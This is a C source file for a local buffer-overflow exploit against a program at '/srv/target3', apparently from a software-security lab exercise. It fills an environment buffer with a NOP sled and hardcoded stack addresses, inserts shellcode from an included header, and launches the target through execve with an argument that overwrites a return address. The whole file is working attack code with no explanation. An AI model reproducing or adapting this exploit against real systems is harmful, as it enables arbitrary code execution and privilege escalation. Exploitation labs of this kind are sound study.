#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target3"

const int BUFFER_SIZE = 400;
const int SHELLCODE_OFFSET = 201;
const uint32_t BASE_ADDRESS = 0xffffdec0;

char* createEnvironment() {
    char *environment = (char *)malloc(BUFFER_SIZE);
    memset(environment, 0x90, BUFFER_SIZE - 1);

    *((uint32_t *)(environment)) = BASE_ADDRESS + 4;
    *((uint32_t *)(environment + 4)) = BASE_ADDRESS + 8;

    memcpy(environment + SHELLCODE_OFFSET, shellcode, sizeof(shellcode));

    return environment;
}

int main(void)
{
    char *args[] = {
        TARGET,
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff",
        NULL
    };
    char *env[] = {createEnvironment(), NULL};

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    free(env[0]);
    return 0;
}